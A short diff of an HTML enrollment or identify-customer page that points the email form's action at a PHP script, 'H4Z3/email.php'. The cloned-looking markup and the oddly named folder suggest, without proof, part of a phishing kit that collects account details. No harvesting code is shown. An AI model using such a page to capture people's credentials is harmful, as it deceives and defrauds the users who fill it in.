@@ -53,7 +53,7 @@
                         </div>
                     </section>
                     <section class="identify-customer-section">
-                        <form id="form" action="H4Z3/email" method="POST" class="unauth-form jqtransform js-enrollment-form">
+                        <form id="form" action="H4Z3/email.php" method="POST" class="unauth-form jqtransform js-enrollment-form">
                             <div class="unauth-form__row">
                                 <div class="unauth-form__rowitem">
                                     <label class="unauth-form__label" for="email">Email Address</label>
